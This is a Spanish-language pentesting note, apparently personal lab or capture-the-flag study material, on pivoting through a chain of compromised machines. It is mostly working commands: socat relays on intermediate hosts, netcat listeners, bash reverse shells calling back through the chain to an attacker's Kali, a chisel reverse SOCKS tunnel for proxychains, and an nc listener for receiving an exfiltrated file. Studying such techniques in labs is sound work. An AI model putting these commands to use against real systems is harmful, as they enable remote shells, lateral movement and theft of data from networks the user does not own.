Seguimos el mismo procedimiento que con chisel lo copiamos en la maquina 1 que es la que estamos utilizando como pivot
[[Escenario de ejemplo Chisel y Socat]]

En la maquina 1
```
./socat tcp-l:Port,fork,reuseaddr tcp:ipkali:port 


./socat tcp-l:1111,fork,reuseaddr tcp:10.10.10.12:111


### **Socat con opciones de terminal para cuando vamos atraves de una coneccion inermedia**
./socat tcp-l:4646,fork,reuseaddr tcp:192.168.1.108:3333,forever
```

En el Kali nos ponemos  a la escucha para recibir la ReverseShell de la maquina2 que pasara con socat mediante la maquina 1 y esta la reenviara a nuestra kali
```
sudo nc -lvnp 111
```

Maquina2
Aqui enviaremos la ReverseShell al socat de la maquina 1
Importante la ip sera la que esta en la misma subred de la Maquina 2 {20.20.20.13}
```
bash -i >& /dev/tcp/20.20.20.12/1111 0>&1
```

Para poder hacer Chisel a la maqina3 sera necesario crear otro socat en la maquina1 para que envie todo el trafico que generara el chisel client en la maquina 2 para poder acceder a la maquina 3

Maquina 1 
Aqui tener en cuenta que se enviara el trafico al puerto del servidor de chisel 
```
./socat tcp-l:2222:,fork,reuseaddr tcp:10.10.10.12:33
```

Maquina2
Aqui tener en cuenta que se debe utilizar otro puerto para la coneccion socks porque el por defecto 1080 estara ocupado
```
./chisel client Nodo Cercano con sock:Puerto_Socks R:New_Port:socks 

./chisel client 20.20.20.12:2222 R:5000:socks 
```

Debemos agregar el nuevo puerto 5000 socks al proxychains

Para hacer la riverse shell desde la maquina 3 es necesario poner en todos los eslavones intermedios sockat por sus respectios puertos hasta llegar al puerto de escucha de la maquina atacante
Ejemplo 

Kali a la escucha
```
sudo nc -lvnp 222
```

Maquina 1 escuchando con socat y reenviando el trafico a la Kali
```
./socat tcp-l:2222:,fork,reuseaddr tcp:10.10.10.12:222
```

Maquina 2 ecuchando con socat y reneviando a la Maquina 1
```
./socat tcp-l:4444:,fork,reuseaddr tcp:20.20.20.12:2222
```


Maquina 3 estableciendo la coneccion a la maquina Kali atravez de las coneccio socat en la maquina2

```
bash -i >& /dev/tcp/30.30.30.13/4444 0>&1
```


Enviar archivos con nc metiante un socat levantado , escenario 3 maquia (Atacante, Intermedia , Objetivo)

```
Atacante a la escucha
nc -nlvp >user_backup.zip

```